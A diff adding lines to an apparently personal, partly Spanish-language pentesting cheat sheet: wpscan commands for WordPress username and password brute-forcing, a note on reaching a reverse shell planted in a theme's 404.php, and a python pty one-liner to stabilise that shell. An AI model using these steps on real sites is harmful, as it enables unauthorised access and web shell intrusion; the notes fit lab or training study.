@@ -10,4 +10,18 @@ add files with extensions
 gobuster dir -u <target_url> -w <wordlist_file> -x <extension>
 
 
+###################################################### wpscan
+wpscan -url "" 
+wpscan -url "" --usernames "" --passwords "dictio"
+
+
+
+acceder a la pagina php con la shell
+http://"ip o url"/wp-content/themes/"tema"/404.php
+
+si la reverse shell es la monkey, para migrar a una shell más estable:
+python -c 'import pty;pty.spawn("/bin/bash")' 
+
+
+
 
